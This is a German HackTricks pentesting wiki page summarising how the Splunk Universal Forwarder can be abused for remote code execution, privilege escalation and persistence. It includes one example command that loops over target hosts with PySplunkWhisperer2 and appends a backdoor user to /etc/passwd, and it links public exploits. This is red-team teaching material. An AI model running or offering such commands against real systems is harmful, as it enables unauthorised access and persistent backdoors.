# Splunk LPE und Persistenz

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

Wenn du eine Maschine **intern** oder **extern** **enumerierst** und **Splunk läuft** (Port 8090), kannst du, wenn du glücklicherweise **gültige Anmeldeinformationen** kennst, den **Splunk-Dienst ausnutzen**, um eine **Shell** als der Benutzer, der Splunk ausführt, zu **starten**. Wenn root es ausführt, kannst du die Berechtigungen auf root eskalieren.

Wenn du bereits root bist und der Splunk-Dienst nicht nur auf localhost hört, kannst du die **Passwort**-Datei **vom** Splunk-Dienst **stehlen** und die Passwörter **knacken** oder **neue** Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.

Im ersten Bild unten siehst du, wie eine Splunkd-Webseite aussieht.



## Zusammenfassung des Splunk Universal Forwarder Agent Exploits

Für weitere Details siehe den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:

**Überblick über den Exploit:**
Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht Angreifern mit dem Agent-Passwort, beliebigen Code auf Systemen auszuführen, die den Agenten ausführen, was potenziell ein ganzes Netzwerk gefährden kann.

**Wichtige Punkte:**
- Der UF-Agent validiert keine eingehenden Verbindungen oder die Authentizität von Code, was ihn anfällig für unbefugte Codeausführung macht.
- Häufige Methoden zur Passwortbeschaffung umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder interner Dokumentation.
- Erfolgreiche Ausnutzung kann zu SYSTEM- oder root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerk-Infiltration führen.

**Ausführung des Exploits:**
1. Angreifer erhält das UF-Agent-Passwort.
2. Nutzt die Splunk-API, um Befehle oder Skripte an die Agenten zu senden.
3. Mögliche Aktionen umfassen Dateiextraktion, Manipulation von Benutzerkonten und Systemkompromittierung.

**Auswirkungen:**
- Vollständige Netzwerkkompromittierung mit SYSTEM/root-Berechtigungen auf jedem Host.
- Möglichkeit, das Logging zu deaktivieren, um der Erkennung zu entgehen.
- Installation von Hintertüren oder Ransomware.

**Beispielbefehl für die Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Verwendbare öffentliche Exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Missbrauch von Splunk-Abfragen

**Für weitere Details siehe den Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
